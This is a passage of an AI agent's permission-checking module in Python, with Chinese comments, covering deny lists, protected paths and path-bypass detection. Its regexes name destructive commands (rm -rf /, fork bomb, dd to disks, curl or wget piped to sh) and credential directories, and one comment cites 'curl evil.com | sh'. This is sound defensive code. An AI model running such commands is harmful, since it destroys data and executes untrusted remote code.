"""权限系统：命令黑名单 + 路径白名单 + 用户审批。

设计参考 业界 的三道闸门：
  闸门 1：硬拒绝（危险命令、受保护路径）
  闸门 2：规则匹配（破坏性命令模式、工作目录外写入）
  闸门 3：用户审批（通过 callback 询问，带会话内缓存）
  闸门 4：aux_llm 分类（feature flag 门控，默认 OFF）

L1（黑名单）是零成本防线，防止灾难性误操作。
L2（路径白名单）保护用户文件和密钥。
L3（审批）给用户最终决定权，但会话内缓存避免重复询问。
L4（LLM 分类）是可选的"慢速深审"：前三道闸门都放过、但也不在破坏性
模式里的命令，由 aux_llm 再做一次语义判断。白名单 13 项快速通道跳过
LLM 调用（ls/cat/git status 等明显安全）。fail-open：AI 调用失败放行。
"""
import asyncio
import json
import logging
import os
import re
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

from agent.atomic_io import atomic_write_text


# ---------------------------------------------------------------------------
# 结果类型
# ---------------------------------------------------------------------------
logger = logging.getLogger(__name__)
@dataclass
class PermissionResult:
    allowed: bool
    reason: str
    gate: str = ""  # "deny" / "protected" / "approval" / "ok"


# ---------------------------------------------------------------------------
# 闸门 1：命令硬拒绝黑名单
# ---------------------------------------------------------------------------

# 每条 (正则, 说明)。正则用 IGNORECASE 匹配。
_DENY_COMMAND_PATTERNS: List[Tuple[str, str]] = [
    # 删除根目录/家目录
    (r"\brm\s+-rf?\s+/(?:\s|$|\*)", "rm -rf 根目录"),
    (r"\brm\s+-rf?\s+~(?:\s|$|\*)", "rm -rf home 目录"),
    (r"\brm\s+-rf?\s+\*\s*$", "rm -rf 通配符"),
    # 提权
    (r"\bsudo\b", "sudo 提权"),
    (r"\bsu\s+-\s*\w", "su 切换用户"),
    # 磁盘破坏
    (r"\bmkfs\b", "格式化文件系统"),
    (r"\bdd\s+if=.*of=/dev/", "dd 写设备文件"),
    (r">\s*/dev/sd[a-z]", "覆盖磁盘设备"),
    # fork bomb
    (r":\(\)\s*\{[^}]*\};", "fork bomb"),
    # 系统控制
    (r"\b(?:shutdown|reboot|halt|poweroff)\b", "关机/重启"),
    (r"\bsystemctl\s+(?:stop|disable)", "停止/禁用系统服务"),
    # Windows 破坏
    (r"\bformat\s+[A-Z]:", "format 磁盘"),
    (r"\bdel\s+/[A-Z]*[fs].*\\(?:Windows|Program Files|System32)", "删除 Windows 系统目录"),
    (r"Remove-Item.*-Recurse.*-Force.*\\(?:Windows|Program)", "PowerShell 强删系统目录"),
    (r"\brmdir\s+/s.*\\(?:Windows|Program)", "rmdir /s 删系统目录"),
    # 权限乱改
    (r"\bchmod\s+-R\s+[0-7]+\s+/\s*$", "全盘改权限"),
    (r"\bchown\s+-R\s+.*\s+/\s*$", "全盘改属主"),
    # 危险管道（远程脚本直接执行）
    (r"\bcurl\s+[^|]*\|\s*(?:ba)?sh", "curl 管道执行远程脚本"),
    (r"\bwget\s+[^|]*\|\s*(?:ba)?sh", "wget 管道执行远程脚本"),
    # 覆盖关键系统文件
    (r">\s*/etc/(?:passwd|shadow|sudoers)", "覆盖系统认证文件"),
    # git 危险操作（强推主分支，两种参数顺序都匹配）
    (r"\bgit\s+push\b.*(?:--force|-f)\b.*\b(?:main|master)\b", "强推主分支"),
    (r"\bgit\s+push\b.*\b(?:main|master)\b.*(?:--force|-f)\b", "强推主分支"),
]
# 模块加载时预编译（避免每次 check 都查 re._cache）
_DENY_COMMAND_PATTERNS_COMPILED: List[Tuple["re.Pattern", str]] = [
    (re.compile(pat, re.IGNORECASE), desc)
    for pat, desc in _DENY_COMMAND_PATTERNS
]


def check_command_deny(command: str) -> Optional[str]:
    """闸门 1：检查命令是否命中硬拒绝黑名单。

    返回匹配的说明（拒绝原因），未命中返回 None。
    """
    for pattern, desc in _DENY_COMMAND_PATTERNS_COMPILED:
        if pattern.search(command):
            return desc
    return None


# ---------------------------------------------------------------------------
# 自我保护：禁止修改 OmniMate 自身的依赖（uv add / pip install）
# ---------------------------------------------------------------------------

def check_self_modification(command: str, cwd: Optional[str] = None) -> Optional[str]:
    """闸门 0:禁止 agent 修改 OmniMate 自身的依赖。

    只保护 OmniMate 自己的代码目录(project_root),不保护用户项目:
    - cwd 在 OmniMate 自身目录内:uv add / pip install 拒绝(防止改坏自身依赖)
    - cwd 在用户项目里:装依赖是改代码的正当工作,一律放行
      (用户项目不一定是 Python:前端项目用 npm/pnpm/yarn,Python 项目用 uv/pip)

    返回拒绝原因,未命中返回 None。
    """
    if not cwd:
        return None
    try:
        from constants import project_root
        root = project_root().resolve()
        cwd_resolved = Path(cwd).resolve()
    except Exception:
        return None

    # 只在 OmniMate 自身目录内才拦截
    in_self = cwd_resolved == root
    if not in_self:
        try:
            cwd_resolved.relative_to(root)
            in_self = True
        except ValueError:
            pass
    if not in_self:
        return None

    if re.search(r"\buv\s+add\b", command, re.IGNORECASE):
        return "在 OmniMate 自身目录内 uv add 会修改自身依赖(pyproject.toml),禁止 agent 操作"
    if re.search(r"\bpip\d?\s+install\b", command, re.IGNORECASE):
        return "在 OmniMate 自身目录内 pip install 会污染自身 venv,禁止 agent 操作"
    return None


# ---------------------------------------------------------------------------
# 不可绕过的系统级破坏（即使 bypassPermissions 也拒）
# ---------------------------------------------------------------------------
# 这组模式与 _DENY_COMMAND_PATTERNS 的区别:
# - _DENY_COMMAND_PATTERNS(闸门 1) 在 bypassPermissions 模式下被跳过
# - _FATAL_IRREVERSIBLE_PATTERNS(闸门 0 的子检查) 在任何模式下都拒绝,
#   作为不可绕过的"硬底线",保护系统不被彻底破坏
_FATAL_IRREVERSIBLE_PATTERNS: List[str] = [
    # rm -rf / 根目录(递归删整个文件系统)
    # 注意:必须只命中"根目录",不能误伤 /home /tmp/x 等子路径。
    # 拆成两条:第一条匹配 rm -rf / 后紧跟空格或行尾(排除 /home 等非根路径);
    # 第二条专门兜底显式 --no-preserve-root(无论后面还有什么参数,都是致命的)。
    r"\brm\s+-rf\s+/(?:\s|$)",
    r"\brm\s+-rf\s+/\s+--no-preserve-root",
    r"\bmkfs\b",                                    # mkfs 格式化文件系统
    r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;",        # fork bomb :(){ :|:& };(容忍空格变体)
    r"\bdd\s+if=.*of=/dev/[sh]d",                   # dd 覆盖磁盘设备
]
_FATAL_IRREVERSIBLE_RE: List["re.Pattern"] = [
    re.compile(p) for p in _FATAL_IRREVERSIBLE_PATTERNS
]


def check_fatal_irreversible(command: str) -> Optional[str]:
    """检查系统级不可逆破坏命令(bypassPermissions 也无法绕过)。

    这是整个权限系统中唯一"绝对不可绕过"的硬底线。即使在
    bypassPermissions 模式下,这些命令也会被拒绝,因为它们会导致:
    - 整个文件系统被删除(rm -rf /)
    - 文件系统被格式化(mkfs)
    - 系统资源耗尽(fork bomb)
    - 物理磁盘数据被覆盖(dd)

    返回拒绝原因,未命中返回 None。
    """
    for pat in _FATAL_IRREVERSIBLE_RE:
        if pat.search(command):
            return f"系统级不可逆命令（任何模式都拒绝）: {command}"
    return None


# ---------------------------------------------------------------------------
# acceptEdits 模式：safe-fs 命令识别（mkdir/touch/mv/cp/rm/del 在 cwd 内）
# ---------------------------------------------------------------------------
# acceptEdits 模式下自动放行的 safe-fs 命令动词
_SAFE_FS_VERBS = {"mkdir", "touch", "mv", "cp", "rm", "del"}

# shell 复合操作符守卫：复合命令风险高，acceptEdits 不自动批
# （例：``rm tmp && curl evil.com | sh`` 的 verb="rm" ∈ SAFE_FS，但 curl 部分
# 会被 shell 执行）。这种命令必须交原审批闸门。
_SHELL_OPS = ("&&", "||", ";", "|", "`", "$(")


def _is_safe_fs_in_cwd(command: str, cwd: Optional[str]) -> bool:
    """acceptEdits 用：命令是 safe-fs 动词（mkdir/touch/mv/cp/rm/del）且
    所有路径参数都在 cwd 内 → 返回 True（可自动批）。

    保守：任何一个路径解析失败或在 cwd 外 → False（交给原闸门判断）。
    含 shell 复合操作符（&&/||/;/|/反引号/$()）→ False（复合命令交原闸门审批）。
    """
    if not command or not cwd:
        return False
    if any(op in command for op in _SHELL_OPS):
        return False
    parts = command.split()
    if not parts:
        return False
    # 取动词（处理 /usr/bin/mkdir 这种绝对路径形式）
    verb = parts[0].replace("\\", "/").split("/")[-1].lower()
    if verb not in _SAFE_FS_VERBS:
        return False
    try:
        cwd_path = Path(cwd).resolve()
    except (OSError, ValueError):
        return False
    for tok in parts[1:]:
        if tok.startswith("-"):
            continue  # flag（如 -rf, -p）
        if not tok:
            continue
        try:
            p = Path(tok)
            resolved = p.resolve() if p.is_absolute() else (cwd_path / p).resolve()
            resolved.relative_to(cwd_path)  # 不在 cwd 下会抛 ValueError
        except (ValueError, OSError, RuntimeError):
            return False  # 路径在 cwd 外或解析失败 → 不自动批
    return True


# ---------------------------------------------------------------------------
# 闸门 2：破坏性命令模式（需用户审批才能执行）
# ---------------------------------------------------------------------------

# 这些命令本身不是灾难性的（不在硬拒绝黑名单），但会造成文件删除/覆盖，
# 应该让用户确认。审批 callback 在 cli.py 注入（用 console.input 问 y/n）。
_DESTRUCTIVE_PATTERNS: List[Tuple[str, str]] = [
    (r"\brm\s+(?!-rf?\s+/(?:\s|$|\*))(?!-rf?\s+~)", "rm 删除"),  # rm 但非根目录
    (r"\bdel\s+", "del 删除"),
    (r"\brmdir\s+", "rmdir 删目录"),
    (r"\berase\s+", "erase 删除"),
    (r"\bRemove-Item\b", "PowerShell Remove-Item"),
    (r"\bshred\s+", "shred 安全删除"),
    (r"\btruncate\s+-s\s*0", "truncate 清空文件"),
    (r"\bgit\s+reset\s+--hard", "git reset --hard 丢弃改动"),
    (r"\bgit\s+clean\s+-[fxd]", "git clean 删未跟踪文件"),
]
_DESTRUCTIVE_PATTERNS_COMPILED: List[Tuple["re.Pattern", str]] = [
    (re.compile(pat, re.IGNORECASE), desc)
    for pat, desc in _DESTRUCTIVE_PATTERNS
]


def check_destructive(command: str) -> Optional[str]:
    """闸门 2：检查命令是否是破坏性操作（需要审批）。

    返回匹配的说明，未命中返回 None。
    """
    for pattern, desc in _DESTRUCTIVE_PATTERNS_COMPILED:
        if pattern.search(command):
            return desc
    return None


# ---------------------------------------------------------------------------
# 受保护路径（读写都拒绝）
# ---------------------------------------------------------------------------

_PROTECTED_PATHS = [
    # SSH / AWS / GPG 密钥
    "~/.ssh",
    "~/.aws",
    "~/.gnupg",
    # CLI 凭证
    "~/.config/gh",        # GitHub CLI token
    "~/.docker",           # docker credentials
    "~/.kube",             # kubernetes 凭证
    # Unix 系统目录
    "/etc",
    "/usr",
    "/bin",
    "/sbin",
    "/boot",
    "/proc",
    "/sys",
    "/dev",
    # Windows 系统目录
    "C:\\Windows",
    "C:\\Program Files",
    "C:\\Program Files (x86)",
]
# 模块加载时预计算（避免每次 safe_path 都 14× resolve）
_PROTECTED_PATHS_RESOLVED: List[Tuple[Path, str]] = []
for _p in _PROTECTED_PATHS:
    try:
        _PROTECTED_PATHS_RESOLVED.append((Path(_p).expanduser().resolve(), _p))
    except (OSError, ValueError):
        # 解析失败的条目跳过（极少数环境下可能发生）
        continue


def _path_forms_for_check(path) -> List[Path]:
    """R16 #5 双路径检查：返回要过安全检查的路径形式列表。

    对齐 CCB getPathsForPermissionCheck 的语义——同一输入产生
    「原始词法形式（expanduser + normpath，不解析软链）」和
    「解析形式（realpath，软链全展开）」两个候选：

    - 防软链指向 ~/.ssh 等保护目标（词法形式无害、解析形式才暴露）
    - 反向防"解析后脱离保护表、词法仍在保护下"的形态
    - 词法形式还覆盖 realpath 失败（如不存在的目标）时保护判定不断轨

    解析整体失败返回空列表（与旧 fail-open 语义一致，safe_path 写路径
    仍会因白名单解析失败而 fail-closed）。
    """
    forms: List[Path] = []
    try:
        p = Path(path).expanduser()
    except (OSError, ValueError, RuntimeError):
        return forms
    try:
        lexical = Path(os.path.normpath(str(p)))
    except (OSError, ValueError):
        lexical = p
    forms.append(lexical)
    try:
        resolved = Path(os.path.realpath(str(p)))
        if resolved != lexical:
            forms.append(resolved)
    except (OSError, ValueError):
        pass
    return forms


def is_protected_path(path) -> Optional[str]:
    """检查路径是否在受保护列表（读写都拒绝）。

    R16 #5：词法 + realpath 双形式都过保护表（防软链绕过）。

    返回匹配的保护项（拒绝原因），未命中返回 None。
    """
    for form in _path_forms_for_check(path):
        for prot, orig in _PROTECTED_PATHS_RESOLVED:
            if form == prot:
                return orig
            # path 在 protected 下
            try:
                form.relative_to(prot)
                return orig
            except ValueError:
                continue
    return None


# ---------------------------------------------------------------------------
# 写保护路径（只禁写,允许读——agent 可以读项目代码,但不能改）
# ---------------------------------------------------------------------------

_WRITE_PROTECTED_PATHS: List[Tuple[Path, str]] = []
try:
    from constants import project_root
    _WRITE_PROTECTED_PATHS.append((project_root().resolve(), "项目代码目录"))
except Exception:
    pass


def is_write_protected_path(path) -> Optional[str]:
    """检查路径是否在写保护列表(只禁写,不禁读)。

    用于防止 agent 修改项目自身的代码。
    R16 #5：词法 + realpath 双形式都过保护表（防软链绕过）。
    """
    for form in _path_forms_for_check(path):
        for prot, orig in _WRITE_PROTECTED_PATHS:
            if form == prot:
                return orig
            try:
                form.relative_to(prot)
                return orig
            except ValueError:
                continue
    return None


# ---------------------------------------------------------------------------
# R16 #2：可疑路径形态检测（Windows 绕过手法，全平台检测）
# ---------------------------------------------------------------------------

# 8.3 短名（GIT~1 / SETTIN~1.JSON / BASHRC~1）
_SHORT_NAME_RE = re.compile(r"~\d")
# 长路径前缀（\\?\ / \\.\ 及正斜杠变体 //?/ //./）
_LONG_PATH_PREFIXES = ("\\\\?\\", "\\\\.\\", "//?/", "//./")
# 尾点/尾空格（Windows 解析时剥离 → ".git." 绕过 ".git" 字符串匹配）
_TRAILING_DOT_SPACE_RE = re.compile(r"[.\s]+$")
# DOS 设备名作扩展名（.git.CON / settings.json.PRN / .bashrc.AUX）
_DOS_DEVICE_EXT_RE = re.compile(
    r"\.(?:CON|PRN|AUX|NUL|COM[1-9]|LPT[1-9])$", re.IGNORECASE
)
# 三连点及以上作为独立路径段（.../file.txt 或 path/.../file；
# 只拦"前后都是分隔符或端点"的段形态，放行 [...] 这类合法命名）
_TRIPLE_DOT_SEGMENT_RE = re.compile(r"(?:^|[/\\])\.{3,}(?:[/\\]|$)")
# 波浪变体（~user / ~+ / ~- / ~N——非 "~" 与 "~/" 起头的形态；
# shell 展开目标（~root → /var/root）与校验目标（当相对路径）不一致）
_TILDE_VARIANT_RE = re.compile(r"^~(?![/\\]|$)")
# glob 元字符（写路径禁止：写工具按字面使用路径，通配符只会绕过校验）
_GLOB_META_RE = re.compile(r"[*?\[\]{}]")


def check_suspicious_path(path, *, write: bool = False) -> Optional[str]:
    """R16 #2：检测可用于绕过安全检查的可疑路径形态（命中即拒）。

    对齐 CCB hasSuspiciousWindowsPathPattern + pathValidation 的波浪变体 /
    写路径 glob 禁令，且按 CC 同样理由**全平台检测**（NTFS 可挂载于任意 OS，
    短名/长前缀等绕过手法在 ntfs-3g 挂载的 Linux/macOS 上同样生效）：

    - NTFS ADS 冒号（file.txt:stream，仅 win32——POSIX 冒号是合法文件名字符）
    - 8.3 短名（GIT~1）
    - 长路径前缀（\\\\?\\ / \\\\.\\）
    - 尾点/尾空格（Windows 解析时剥离）
    - DOS 设备名扩展（CON/PRN/AUX/NUL/COM1-9/LPT1-9）
    - 三连点路径段（.../file）
    - UNC 路径（\\\\server\\share——远程资源访问 + 凭证泄露 + 绕过工作目录限制）
    - 波浪变体（~user / ~+ / ~N）
    - glob 元字符（仅写路径；读路径的 glob 由 glob 工具自己展开）

    返回拒绝原因（中文说明），未命中返回 None。
    """
    try:
        s = str(path)
    except Exception:
        return None
    if not s:
        return None

    # 长路径前缀先于 ADS 冒号检查（\\?\C:\ 里的冒号是盘符不是 ADS）
    if s.startswith(_LONG_PATH_PREFIXES):
        return "长路径前缀（\\\\?\\ / \\\\.\\）"
    # NTFS ADS 冒号：跳过盘符冒号（C:\ 在位置 1），从位置 2 起找
    if sys.platform == "win32" and s.find(":", 2) != -1:
        return "NTFS ADS 冒号形态（file:stream）"
    if _SHORT_NAME_RE.search(s):
        return "8.3 短名形态（NAME~1）"
    # 尾点/尾空格：只看最后一个路径段（裸 "."/".." 是目录引用，放行）
    _last_seg = re.split(r"[/\\]", s)[-1]
    if _last_seg and _last_seg not in (".", "..") and _TRAILING_DOT_SPACE_RE.search(_last_seg):
        return "尾点/尾空格（Windows 解析时剥离，可绕过路径匹配）"
    if _DOS_DEVICE_EXT_RE.search(s):
        return "DOS 设备名扩展（CON/PRN/AUX/NUL/COM/LPT）"
    if _TRIPLE_DOT_SEGMENT_RE.search(s):
        return "三连点路径段（...）"
    if s.startswith("\\\\") or s.startswith("//"):
        return "UNC 路径（网络资源访问）"
    if _TILDE_VARIANT_RE.match(s):
        return "波浪变体（~user / ~+ / ~N，shell 展开目标与校验目标不一致）"
    if write and _GLOB_META_RE.search(s):
        return "写路径含 glob 元字符（写工具按字面使用路径）"
    return None


# ---------------------------------------------------------------------------
# 路径白名单（写操作检查）
# ---------------------------------------------------------------------------

# 运行时额外白名单（/add-dir 命令追加；进程级，重启靠 config 持久化 + 启动加载）。
# 注意：受保护路径（~/.ssh / /etc 等）和项目代码写保护在 safe_path 里先于
# 白名单检查——追加白名单不能绕过这些硬底线（安全默认 > 事后补救）。
_EXTRA_ALLOWED_ROOTS: List[Path] = []


def add_extra_allowed_root(root) -> bool:
    """运行时追加 safe_path 写白名单根目录（幂等）。

    返回 True 表示新增，False 表示已存在（去重，不重复加）。
    """
    resolved = Path(root).expanduser().resolve()
    if resolved in _EXTRA_ALLOWED_ROOTS:
        return False
    _EXTRA_ALLOWED_ROOTS.append(resolved)
    return True


def list_extra_allowed_roots() -> List[Path]:
    """列出运行时追加的额外白名单（拷贝，防外部改内部列表）。"""
    return list(_EXTRA_ALLOWED_ROOTS)


def clear_extra_allowed_roots() -> None:
    """清空运行时额外白名单（测试用）。"""
    _EXTRA_ALLOWED_ROOTS.clear()


def remove_extra_allowed_root(root) -> bool:
    """运行时移除一条额外白名单（T5 /approved remove-root 用）。

    返回 True 表示移除成功，False 表示不在白名单中。
    """
    resolved = Path(root).expanduser().resolve()
    if resolved in _EXTRA_ALLOWED_ROOTS:
        _EXTRA_ALLOWED_ROOTS.remove(resolved)
        return True
    return False


def default_allowed_roots() -> List[Path]:
    """默认允许写入的根目录：cwd + ~/.OmniMate + /add-dir 追加的额外白名单。

    Round 1 fix: Path.cwd() 是进程级（=os.getcwd），并发子代理会踩到别人的 cwd。
    改走 get_workspace_cwd()（线程局部 ContextVar），子代理在自己 worktree 内
    写文件时白名单会包含 worktree 路径，不会被 safe_path 拒绝。
    """
    from agent.workspace_context import get_workspace_cwd
    roots = [Path(get_workspace_cwd()).resolve()]
    try:
        from constants import get_omnimate_home
        roots.append(get_omnimate_home().resolve())
    except Exception:
        pass
    # CCAR11 Task 4: /add-dir 运行时追加的额外白名单（含启动时从 config 加载的）
    roots.extend(_EXTRA_ALLOWED_ROOTS)
    return roots


def safe_path(
    path,
    *,
    write: bool = False,
    allowed_roots: Optional[List] = None,
) -> PermissionResult:
    """检查路径是否安全可访问。

    读：不在 _PROTECTED_PATHS 即可。
    写：不在 _PROTECTED_PATHS 且在 allowed_roots 之一下。

    返回 PermissionResult。
    """
    # R16 #2：可疑路径形态前置检查（读写都查，命中即拒）
    susp = check_suspicious_path(path, write=write)
    if susp:
        return PermissionResult(False, f"可疑路径形态: {susp}", "suspicious")

    # 先检查受保护路径（读写都拒）
    prot = is_protected_path(path)
    if prot:
        return PermissionResult(False, f"受保护路径: {prot}", "protected")

    if not write:
        return PermissionResult(True, "ok", "ok")

    # 写保护路径(只禁写:项目代码目录)
    wprot = is_write_protected_path(path)
    if wprot:
        return PermissionResult(
            False,
            f"写保护(项目代码保护,不允许修改): {wprot}",
            "protected",
        )

    # 写操作检查白名单
    if allowed_roots is None:
        allowed_roots = default_allowed_roots()
    allowed_roots = [Path(p).resolve() for p in allowed_roots]

    try:
        resolved = Path(path).expanduser().resolve()
    except (OSError, ValueError) as e:
        return PermissionResult(False, f"路径解析失败: {e}", "protected")

    for root in allowed_roots:
        try:
            if resolved == root:
                return PermissionResult(True, "白名单内", "ok")
            resolved.relative_to(root)
            return PermissionResult(True, "白名单内", "ok")
        except (OSError, ValueError):
            # X17 fix: 合并 OSError + ValueError 到一个 except
            # 之前两段连续 except 是死代码（ValueError 已被前者捕获）
            continue

    return PermissionResult(
        False,
        f"写入路径不在白名单: {resolved}（允许: {allowed_roots}）",
        "protected",
    )


# ---------------------------------------------------------------------------
# T7（核心机制对齐第 7 项）：只读命令识别 → 快速通道 + concurrency-safe
# ---------------------------------------------------------------------------

# 只读前缀表（对齐 CCB 只读命令识别；前缀 + 空白匹配，参数任意）
# 注意：只收"无副作用"形态——git branch/tag/remote 等只列只读子形态
_READONLY_PREFIXES = frozenset({
    # 文件/目录查看
    "ls", "dir", "tree", "pwd", "cat", "head", "tail", "wc", "file", "stat",
    "du", "df", "which", "where", "whereis", "type",
    # 搜索（find 的 -delete/-exec 等写形态由 _READONLY_FORBIDDEN_TOKENS 拦）
    "find", "grep", "rg", "ag", "findstr",
    # git 只读子命令（写形态 push/commit/checkout 等不在表里；
    # branch/tag/remote 只收只读子形态——带名字参数的 "git branch x" 是写）
    "git status", "git log", "git diff", "git show", "git blame",
    "git shortlog", "git describe", "git rev-parse", "git ls-files",
    "git ls-remote", "git remote -v",
    "git branch -a", "git branch -v", "git branch -r",
    "git branch --list", "git branch --all", "git branch --show-current",
    "git tag -l", "git tag --list",
    "git stash list", "git config --get", "git worktree list",
    # 包管理只读
    "pip list", "pip show", "pip freeze", "uv pip list",
    "npm list", "npm ls",
    # 版本/环境信息
    "git --version", "python --version", "python3 --version",
    "node --version", "java -version", "go version",
    "rustc --version", "cargo --version", "uv --version", "pytest --version",
    # 系统信息（env 不进表：env VAR=x cmd 可执行任意命令）
    "whoami", "hostname", "uname", "date", "printenv", "echo",
    "id", "systeminfo", "tasklist",
})

# 只读段里禁止出现的 token（find 的写形态等）
_READONLY_FORBIDDEN_TOKENS = (
    "-delete", "-exec", "-execdir", "-ok", "-okdir",
    "-fprint", "-fprintf", "-fls", "-fprint0",
)

# 复合命令切分（&& || ; |）+ 子命令替换（$() 反引号）+ 重定向（> >>）
_COMPOUND_SPLIT_RE = re.compile(r"&&|\|\||;|\|")
_SUBSHELL_RE = re.compile(r"\$\(|`")
_REDIRECT_RE = re.compile(r"(?:^|\s|\d)>{1,2}(?:&\d+)?")


def _is_readonly_segment(seg: str) -> bool:
    """单个命令段是否只读（前缀表匹配 + 写形态 token 拦截）。"""
    seg = seg.strip()
    if not seg:
        return True  # 空段（尾随 ; 等）忽略
    if _SUBSHELL_RE.search(seg) or _REDIRECT_RE.search(seg):
        return False
    lowered = seg.lower()
    for token in _READONLY_FORBIDDEN_TOKENS:
        if token in lowered:
            return False
    for prefix in _READONLY_PREFIXES:
        if lowered == prefix or lowered.startswith(prefix + " "):
            return True
    return False


def _is_readonly_command(command: str) -> bool:
    """命令是否整体只读（T7）。

    复合命令（含 && / || / ; / | / $() / 反引号）必须**每段**都是只读才算只读；
    出现重定向（> >>）直接判非只读。保守优先：识别不了的形态一律不算只读。
    """
    if not command or not command.strip():
        return False
    if _SUBSHELL_RE.search(command) or _REDIRECT_RE.search(command):
        return False
    for seg in _COMPOUND_SPLIT_RE.split(command):
        if not _is_readonly_segment(seg):
            return False
    return True


def is_readonly_command(command: str) -> bool:
    """公开入口：terminal 并发分组用（与审批快速通道同一张表）。"""
    return _is_readonly_command(command)


# ---------------------------------------------------------------------------
# 闸门 4：aux_llm 分类器（feature flag 门控，默认 OFF）
# ---------------------------------------------------------------------------
#
# 触发条件：前三道闸门都未拒绝也未要求审批（即落到 check() 末尾的"默认通过"）
#           且 feature flag bash_llm_classifier.enabled=True。
# 白名单快速通道（spec §4 决策 4）：命令匹配白名单前缀（如 "ls"、"git status"）
#           则直接放行，0 LLM 调用。白名单从 config.features.bash_llm_classifier.whitelist 读。
# AI 判断：safe → 放行；unsafe → 拒绝 + 原因。fail-open：LLM 调用失败 → 放行（log warning）。
#
# 注：aux_llm_router.chat_completions 是 async（Task D4）；
#     PermissionChecker.check 是 sync 函数 → 用 asyncio.run 桥接
#     （参考 progress.py:124 / reflection.py:150 的同款模式）。

# 分类 prompt：要 LLM 输出严格 JSON，便于解析
_CLASSIFY_PROMPT_TEMPLATE = (
    "判断下面这条 bash/shell 命令是否安全执行（不破坏文件、不泄露数据、不改系统关键配置）。\n"
    "只考虑命令本身的直接效果，不要推测用户的意图。\n\n"
    "命令：{cmd}\n\n"
    "输出严格 JSON（不要 markdown 代码块、不要额外解释）：\n"
    '{{"safe": true}} 或 {{"safe": false, "reason": "<=40 字中文理由>"}}'
)


def _matches_whitelist(command: str, whitelist: List[str]) -> bool:
    """检查命令是否匹配白名单前缀（快速通道，0 LLM 调用）。

    判断规则（spec §4 决策 4）：
    - 命令去除前导空白后，以白名单条目 + 空白/行尾 开头
    - 例：白名单 "ls" 匹配 "ls -la"、"ls /tmp"；不匹配 "ls; rm -rf /"（含复合操作符）
    - 含 shell 复合操作符（&&/||/;/|/反引号/$()）的命令不匹配（保守，交 LLM 判）
    """
    if not command or not whitelist:
        return False
    cmd = command.strip()
    # 含复合操作符的命令不走快速通道（可能藏危险子命令）
    if any(op in cmd for op in ("&&", "||", ";", "|", "`", "$(")):
        return False
    for entry in whitelist:
        if not entry:
            continue
        # 精确匹配（命令就是白名单条目本身）
        if cmd == entry:
            return True
        # 前缀 + 空白（"ls -la" 匹配 "ls" + " "）
        if cmd.startswith(entry) and len(cmd) > len(entry) and cmd[len(entry)].isspace():
            return True
    return False


async def _classify_bash_command(command: str, aux_llm_router: Any) -> Dict[str, Any]:
    """调 aux_llm 判断命令是否安全。

    Args:
        command: 要判断的 shell 命令
        aux_llm_router: AuxLLMRouter 实例（必须有 async chat_completions）

    Returns:
        Dict：
        - {"safe": True} 判安全
        - {"safe": False, "reason": "..."} 判不安全
        - {"error": "..."} 调用失败（fail-open，调用方放行）

    解析失败（LLM 没输出合法 JSON）→ 返回 {"error": "..."}，调用方 fail-open 放行。
    """
    if aux_llm_router is None:
        # 没有 aux_llm → 不分类（check() 会 fail-open 放行）
        return {"error": "aux_llm_router 未注入"}

    prompt = _CLASSIFY_PROMPT_TEMPLATE.format(cmd=command)
    try:
        resp = await aux_llm_router.chat_completions(
            [{"role": "user", "content": prompt}],
        )
    except Exception as e:
        # 调用本身抛异常 → fail-open
        logger.warning("bash_llm_classifier: aux_llm 调用异常（fail-open 放行）: %s", e)
        return {"error": f"aux_llm 调用异常: {e}"}

    # 解析响应：resp.choices[0].message.content
    try:
        text = resp.choices[0].message.content or ""
    except (AttributeError, IndexError, TypeError) as e:
        logger.warning("bash_llm_classifier: aux_llm 响应格式异常（fail-open）: %s", e)
        return {"error": f"响应格式异常: {e}"}

    text = text.strip()
    # 剥离可能的 markdown 代码块包裹（LLM 偶尔不听话）
    if text.startswith("```"):
        text = text.strip("`")
        # 去掉可能的 "json" 语言标识
        if text.lower().startswith("json"):
            text = text[4:]
        text = text.strip()

    try:
        parsed = json.loads(text)
    except json.JSONDecodeError as e:
        logger.warning(
            "bash_llm_classifier: aux_llm 输出非 JSON（fail-open 放行）: %r", text[:100]
        )
        return {"error": f"输出非 JSON: {text[:80]}"}

    if not isinstance(parsed, dict) or "safe" not in parsed:
        logger.warning("bash_llm_classifier: aux_llm 输出缺 safe 字段: %r", text[:100])
        return {"error": f"输出缺 safe 字段: {text[:80]}"}

    return parsed


# ---------------------------------------------------------------------------
# R16 #6：危险删除路径判定（rm/rmdir/del/erase/rd 目标参数化检查）
# ---------------------------------------------------------------------------

# Windows 盘根（C: 或 C:/）
_WIN_DRIVE_ROOT_RE = re.compile(r"^[A-Za-z]:/?$")
# Windows 盘根直接子目录（C:/Windows、C:/Users）
_WIN_DRIVE_CHILD_RE = re.compile(r"^[A-Za-z]:/[^/]+$")


def is_dangerous_removal_path(resolved_path) -> bool:
    r"""删除命令的目标路径是否危险（对齐 CCB isDangerousRemovalPath）。

    危险目标：
    - 裸通配符 *（删目录下全部内容）/ 任何 /* 结尾
    - 根目录 /
    - 家目录
    - 根直接子目录（/usr、/tmp、/etc——但 /usr/local 不是）
    - Windows 盘根（C:\）与盘根直接子目录（C:\Windows、C:\Users）
    """
    s = re.sub(r"[\\/]+", "/", str(resolved_path))

    if s == "*" or s.endswith("/*"):
        return True

    normalized = s if s == "/" else (s.rstrip("/") or "/")
    if normalized == "/":
        return True
    if _WIN_DRIVE_ROOT_RE.match(normalized):
        return True

    home = re.sub(r"[\\/]+", "/", str(Path.home()))
    if normalized.lower() == home.lower():
        return True

    # 根直接子目录：/usr、/tmp（parent == /）
    if normalized.startswith("/"):
        parts = normalized.lstrip("/").split("/")
        if len(parts) == 1 and parts[0]:
            return True

    if _WIN_DRIVE_CHILD_RE.match(normalized):
        return True
    return False


# 删除类动词（首 token；Remove-Item 走闸门 2 破坏性审批兜底，不在此列）
_REMOVAL_VERBS = frozenset({"rm", "rmdir", "del", "erase", "rd"})
# 复合命令切段（与只读通道同款）
_CMD_SEGMENT_SPLIT_RE = re.compile(r"&&|\|\||;|\|")
# Windows del/rd 的斜杠 flag（/s /q）；不匹配 /usr 这类真路径
_CMD_FLAG_RE = re.compile(r"^-[A-Za-z]*$|^/[A-Za-z]?$")


def check_dangerous_removal(command: str, cwd: Optional[str] = None) -> Optional[str]:
    """R16 #6：rm/del 类删除命令的目标为危险路径 → 拒。

    任何审批模式下默认拒（不进 fatal——bypassPermissions 仍放行；
    default/acceptEdits/autoDeny 都拒，不接受审批解锁：y/n 误点正是
